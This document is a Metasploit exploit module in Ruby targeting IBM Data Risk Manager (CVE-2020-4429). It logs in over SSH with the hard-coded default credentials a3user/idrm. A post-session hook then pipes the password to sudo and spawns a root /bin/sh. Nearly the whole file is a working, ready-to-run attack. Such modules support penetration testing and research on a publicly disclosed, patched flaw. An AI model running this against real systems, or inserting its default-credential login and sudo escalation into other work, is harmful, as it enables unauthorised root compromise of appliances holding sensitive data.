##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SSH

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'IBM Data Risk Manager a3user Default Password',
        'Description' => %q{
          This module abuses a known default password in IBM Data Risk Manager. The 'a3user'
          has the default password 'idrm' and allows an attacker to log in to the virtual appliance
          via SSH. This can be escalate to full root access, as 'a3user' has sudo access with the default password.
          At the time of disclosure this was an 0day, but it was later confirmed and patched by IBM.
          Versions <= 2.0.6.1 are confirmed to be vulnerable.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module
        ],
        'References' => [
          [ 'CVE', '2020-4429' ], # insecure default password
          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ],
          [ 'URL', 'https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/']
        ],
        'Payload' => {
          'Compat' => {
            'PayloadType' => 'cmd_interact',
            'ConnectionType' => 'find'
          }
        },
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Targets' => [
          [ 'IBM Data Risk Manager <= 2.0.6.1', {} ]
        ],
        'Privileged' => true,
        'DefaultTarget' => 0,
        'DisclosureDate' => '2020-04-21'
      )
    )

    register_options(
      [
        Opt::RPORT(22),
        OptString.new('USERNAME', [true, 'Username to login with', 'a3user']),
        OptString.new('PASSWORD', [true, 'Password to login with', 'idrm'])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )
  end

  def on_new_session(client)
    print_status("#{peer} - Escalating privileges to root, please wait a few seconds...")
    # easiest way I found to get passwordless root, not sure if there's a shorter command
    client.shell_command_token("echo #{datastore['PASSWORD']} | sudo -S 'echo 2>/dev/null'; sudo /bin/sh")
    print_good("#{peer} - Done, enjoy your root shell!")
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def do_login(user, pass)
    factory = ssh_socket_factory
    opts = {
      auth_methods: ['password', 'keyboard-interactive'],
      port: rport,
      use_agent: false,
      config: false,
      password: pass,
      proxy: factory,
      non_interactive: true,
      verify_host_key: :never
    }

    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    begin
      ssh =
        ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
          Net::SSH.start(rhost, user, opts)
        end
    rescue Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} SSH - Connection error")
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Failure::Unknown, "#{peer} SSH - Disconnected during negotiation")
    rescue ::Timeout::Error
      fail_with(Failure::Unknown, "#{peer} SSH - Timed out during negotiation")
    rescue Net::SSH::AuthenticationFailed
      fail_with(Failure::Unknown, "#{peer} SSH - Failed authentication")
    rescue Net::SSH::Exception => e
      fail_with(Failure::Unknown, "#{peer} SSH Error: #{e.class} : #{e.message}")
    end

    return Net::SSH::CommandStream.new(ssh) if ssh

    nil
  end

  def exploit
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']

    print_status("#{peer} - Attempting to log in to the IBM Data Risk Manager appliance...")
    conn = do_login(user, pass)
    if conn
      print_good("#{peer} - Login successful (#{user}:#{pass})")
      handler(conn.lsock)
    end
  end
end
